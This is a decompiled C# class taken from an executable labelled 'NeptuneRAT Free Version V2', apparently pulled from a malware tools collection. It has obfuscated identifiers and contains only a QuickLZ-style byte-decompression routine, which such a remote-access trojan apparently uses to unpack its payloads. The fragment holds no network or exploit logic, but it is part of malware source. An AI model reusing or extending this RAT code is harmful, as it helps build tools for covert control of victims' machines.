// Decompiled with JetBrains decompiler
// Type: ⚔️MasonRAT✌؍؍ﻻ؊ڣـۭۚ؊؊ٺۭۧ
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;

#nullable disable
public class \u2694️MasonRAT\u270C\u060D\u060Dﻻ\u060Aڣـۭۚ\u060A\u060Aٺۭۧ
{
  public static byte[] ټ\u060F\u060Aۭٸ\u060Eـ\u060Dڣ\u0608ـٽ\u0609ب\u060D\u060Bى(
    [In] byte[] obj0,
    [In] int obj1)
  {
    byte[] second = new byte[1]{ (byte) obj1 };
    obj0 = ((IEnumerable<byte>) obj0).Concat<byte>((IEnumerable<byte>) second).ToArray<byte>();
    int length = \u2694️MasonRAT\u270C\u060D\u060Dﻻ\u060Aڣـۭۚ\u060A\u060Aٺۭۧ.\u0609ـ\u0609ۧ\u060Aـگؤـ\u0608\u060E\u0608\u060Fﻼة̍ﻋ\u060Aڅٽڙـ(obj0);
    int index1 = \u2694️MasonRAT\u270C\u060D\u060Dﻻ\u060Aڣـۭۚ\u060A\u060Aٺۭۧ.ٸ\u060Aــڙـ\u0608\u060C\u0609\u060Dژﻻ̍(obj0);
    int index2 = 0;
    uint num1 = 1;
    byte[] numArray1 = new byte[length];
    int[] numArray2 = new int[4096 /*0x1000*/];
    byte[] numArray3 = new byte[4096 /*0x1000*/];
    int num2 = length - 6 - 4 - 1;
    int index3 = -1;
    uint num3 = 0;
    int num4 = (int) obj0[0] >> 2 & 3;
    if (num4 != 1)
      ;
    if (((int) obj0[0] & 1) != 1)
    {
      byte[] destinationArray = new byte[length];
      Array.Copy((Array) obj0, \u2694️MasonRAT\u270C\u060D\u060Dﻻ\u060Aڣـۭۚ\u060A\u060Aٺۭۧ.ٸ\u060Aــڙـ\u0608\u060C\u0609\u060Dژﻻ̍(obj0), (Array) destinationArray, 0, length);
      return destinationArray;
    }
    while (true)
    {
      if (num1 == 1U)
      {
        num1 = (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/ | (int) obj0[index1 + 3] << 24);
        index1 += 4;
        if (index2 <= num2)
          num3 = num4 != 1 ? (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/ | (int) obj0[index1 + 3] << 24) : (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/);
      }
      if (((int) num1 & 1) == 1)
      {
        num1 >>= 1;
        uint index4;
        uint num5;
        if (num4 == 1)
        {
          int index5 = (int) num3 >> 4 & 4095 /*0x0FFF*/;
          index4 = (uint) numArray2[index5];
          if (((int) num3 & 15) != 0)
          {
            num5 = (uint) (((int) num3 & 15) + 2);
            index1 += 2;
          }
          else
          {
            num5 = (uint) obj0[index1 + 2];
            index1 += 3;
          }
        }
        else
        {
          uint num6;
          if (((int) num3 & 3) == 0)
          {
            num6 = (num3 & (uint) byte.MaxValue) >> 2;
            num5 = 3U;
            ++index1;
          }
          else if (((int) num3 & 2) == 0)
          {
            num6 = (num3 & (uint) ushort.MaxValue) >> 2;
            num5 = 3U;
            index1 += 2;
          }
          else if (((int) num3 & 1) == 0)
          {
            num6 = (num3 & (uint) ushort.MaxValue) >> 6;
            num5 = (uint) (((int) (num3 >> 2) & 15) + 3);
            index1 += 2;
          }
          else if (((int) num3 & (int) sbyte.MaxValue) != 3)
          {
            num6 = num3 >> 7 & 131071U /*0x01FFFF*/;
            num5 = (uint) (((int) (num3 >> 2) & 31 /*0x1F*/) + 2);
            index1 += 3;
          }
          else
          {
            num6 = num3 >> 15;
            num5 = (uint) (((int) (num3 >> 7) & (int) byte.MaxValue) + 3);
            index1 += 4;
          }
          index4 = (uint) ((ulong) index2 - (ulong) num6);
        }
        numArray1[index2] = numArray1[(int) index4];
        numArray1[index2 + 1] = numArray1[(int) index4 + 1];
        numArray1[index2 + 2] = numArray1[(int) index4 + 2];
        for (int index6 = 3; (long) index6 < (long) num5; ++index6)
          numArray1[index2 + index6] = numArray1[(long) index4 + (long) index6];
        index2 += (int) num5;
        if (num4 == 1)
        {
          uint num7 = (uint) ((int) numArray1[index3 + 1] | (int) numArray1[index3 + 2] << 8 | (int) numArray1[index3 + 3] << 16 /*0x10*/);
          while ((long) index3 < (long) index2 - (long) num5)
          {
            ++index3;
            int index7 = ((int) (num7 >> 12) ^ (int) num7) & 4095 /*0x0FFF*/;
            numArray2[index7] = index3;
            numArray3[index7] = (byte) 1;
            num7 = (uint) ((ulong) (num7 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) numArray1[index3 + 3] << 16 /*0x10*/));
          }
          num3 = (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/);
        }
        else
          num3 = (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/ | (int) obj0[index1 + 3] << 24);
        index3 = index2 - 1;
      }
      else if (index2 <= num2)
      {
        numArray1[index2] = obj0[index1];
        ++index2;
        ++index1;
        num1 >>= 1;
        if (num4 == 1)
        {
          while (index3 < index2 - 3)
          {
            ++index3;
            int num8 = (int) numArray1[index3] | (int) numArray1[index3 + 1] << 8 | (int) numArray1[index3 + 2] << 16 /*0x10*/;
            int index8 = (num8 >> 12 ^ num8) & 4095 /*0x0FFF*/;
            numArray2[index8] = index3;
            numArray3[index8] = (byte) 1;
          }
          num3 = (uint) ((ulong) (num3 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) obj0[index1 + 2] << 16 /*0x10*/));
        }
        else
          num3 = (uint) ((ulong) (num3 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) obj0[index1 + 2] << 16 /*0x10*/) | (ulong) ((int) obj0[index1 + 3] << 24));
      }
      else
        break;
    }
    while (index2 <= length - 1)
    {
      if (num1 == 1U)
      {
        index1 += 4;
        num1 = 2147483648U /*0x80000000*/;
      }
      numArray1[index2] = obj0[index1];
      ++index2;
      ++index1;
      num1 >>= 1;
    }
    return numArray1;
  }

  public static int ٸ\u060Aــڙـ\u0608\u060C\u0609\u060Dژﻻ̍([In] byte[] obj0)
  {
    return ((int) obj0[0] & 2) != 2 ? 3 : 9;
  }

  public static int \u0609ـ\u0609ۧ\u060Aـگؤـ\u0608\u060E\u0608\u060Fﻼة̍ﻋ\u060Aڅٽڙـ([In] byte[] obj0)
  {
    return \u2694️MasonRAT\u270C\u060D\u060Dﻻ\u060Aڣـۭۚ\u060A\u060Aٺۭۧ.ٸ\u060Aــڙـ\u0608\u060C\u0609\u060Dژﻻ̍(obj0) == 9 ? (int) obj0[5] | (int) obj0[6] << 8 | (int) obj0[7] << 16 /*0x10*/ | (int) obj0[8] << 24 : (int) obj0[2];
  }
}
